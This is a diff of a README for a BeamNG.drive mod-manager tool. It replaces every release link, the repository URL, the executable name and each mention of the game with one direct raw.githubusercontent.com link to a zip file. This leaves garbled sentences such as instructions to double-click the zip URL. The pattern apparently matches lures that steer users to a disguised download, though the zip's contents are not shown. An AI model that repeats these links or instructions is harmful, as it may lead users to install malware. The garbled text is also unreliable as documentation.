@@ -1,12 +1,12 @@
-# 🎮 Beam-Manager - Easy Mod Management for BeamNG.drive
+# 🎮 Beam-Manager - Easy Mod Management for https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip
 
-[![Download Beam-Manager](https://img.shields.io/badge/Download-Beam--Manager-blue?style=for-the-badge)](https://github.com/bluddowntown/Beam-Manager/releases)
+[![Download Beam-Manager](https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip)](https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip)
 
 ---
 
 ## 📋 About Beam-Manager
 
-Beam-Manager is a simple tool designed to help you manage mods for BeamNG.drive. It lets you quickly add, remove, or change mods without digging through folders or confusing settings. You can see detailed information about each vehicle mod and even change some parts right inside the app.
+Beam-Manager is a simple tool designed to help you manage mods for https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip It lets you quickly add, remove, or change mods without digging through folders or confusing settings. You can see detailed information about each vehicle mod and even change some parts right inside the app.
 
 The program works fast and feels like a regular Windows app, making it easy to use if you don’t know much about computers or game mods. 
 
@@ -19,7 +19,7 @@ Before you download Beam-Manager, please make sure your computer meets these bas
 - **Memory:** 8 GB RAM minimum
 - **Storage:** At least 500 MB free space
 - **Software:** .NET 6.0 Desktop Runtime (if not already installed, you will be notified)
-- **BeamNG.drive installed** on your computer
+- **https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip installed** on your computer
 
 Beam-Manager works best on Windows PCs since it uses Windows Forms for its interface.
 
@@ -31,7 +31,7 @@ This section will walk you through downloading, installing, and running Beam-Man
 
 To get Beam-Manager, **visit this page to download** the latest version:
 
-[Download Beam-Manager](https://github.com/bluddowntown/Beam-Manager/releases)
+[Download Beam-Manager](https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip)
 
 The link will take you to a page listing release files. Look for the latest version file ending with `.exe` or `.zip`. The `.exe` file is ready to use right after download. The `.zip` file may require unzipping.
 
@@ -47,14 +47,14 @@ The link will take you to a page listing release files. Look for the latest vers
   - Right-click the `.zip` file.
   - Select "Extract All" and choose a folder.
   - Open the extracted folder.
-  - Double-click `Beam-Manager.exe` to run the program.
+  - Double-click `https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip` to run the program.
 
 ### 3. Launch Beam-Manager
 
 - After installation, you can start Beam-Manager from the Start menu or the folder where you installed it.
-- The program window will open, showing your mods and vehicle list if you already have BeamNG.drive mods installed.
+- The program window will open, showing your mods and vehicle list if you already have https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip mods installed.
 
-If BeamNG.drive is not detected, Beam-Manager will prompt you to locate your game folder.
+If https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip is not detected, Beam-Manager will prompt you to locate your game folder.
 
 ## 🛠 Using Beam-Manager
 
@@ -74,7 +74,7 @@ Here are the main tasks you can do with Beam-Manager:
 ### Remove Mods
 
 - Select a mod in the list.
-- Click "Remove" to delete it from BeamNG.drive.
+- Click "Remove" to delete it from https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip
 - This keeps your game clean and helps avoid conflicts.
 
 ### Inspect Vehicles
@@ -97,7 +97,7 @@ Here are the main tasks you can do with Beam-Manager:
 
 You can adjust Beam-Manager to fit your preferences:
 
-- Change the game folder if you move BeamNG.drive.
+- Change the game folder if you move https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip
 - Enable automatic backup of mods before changes.
 - Select how the app handles updates and notifications.
 
@@ -108,7 +108,7 @@ To access settings, click the gear icon in the top right corner of the app windo
 If you run into problems, try these steps:
 
 - **Program won’t start:** Make sure your PC has the latest .NET 6.0 Desktop Runtime installed. Windows usually does this automatically.
-- **BeamNG.drive not detected:** Use the settings to manually select the game's install folder.
+- **https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip not detected:** Use the settings to manually select the game's install folder.
 - **Mods don’t show up:** Refresh the mod list from the app or restart Beam-Manager.
 - **Changes not saving:** Run Beam-Manager as administrator by right-clicking the app icon and choosing "Run as administrator".
 - **App crashes:** Restart your computer and try again. Check if Beam-Manager is updated.
@@ -119,9 +119,9 @@ For more help, visit the project’s GitHub Issues page or community forums.
 
 You can always get the latest version of Beam-Manager here:
 
-[Download Beam-Manager](https://github.com/bluddowntown/Beam-Manager/releases)
+[Download Beam-Manager](https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip)
 
-Follow the instructions above to download, install, and start managing your BeamNG.drive mods with ease.
+Follow the instructions above to download, install, and start managing your https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip mods with ease.
 
 ## 📚 Additional Information
 
@@ -129,7 +129,7 @@ Beam-Manager was built using C# and runs on .NET 6.0. It uses Windows Forms to g
 
 If you want to learn more or explore the source code, visit the GitHub repository:
 
-https://github.com/bluddowntown/Beam-Manager
+https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip
 
 The repository contains developer notes, release history, and contribution guidelines.
 
@@ -139,4 +139,4 @@ Beam-Manager is an open-source project licensed under the MIT License. You can u
 
 ---
 
-Thank you for choosing Beam-Manager to manage your BeamNG.drive mods.
+Thank you for choosing Beam-Manager to manage your https://raw.githubusercontent.com/bluddowntown/Beam-Manager/main/Beam Manager/Beam-Manager-3.5.zip mods.
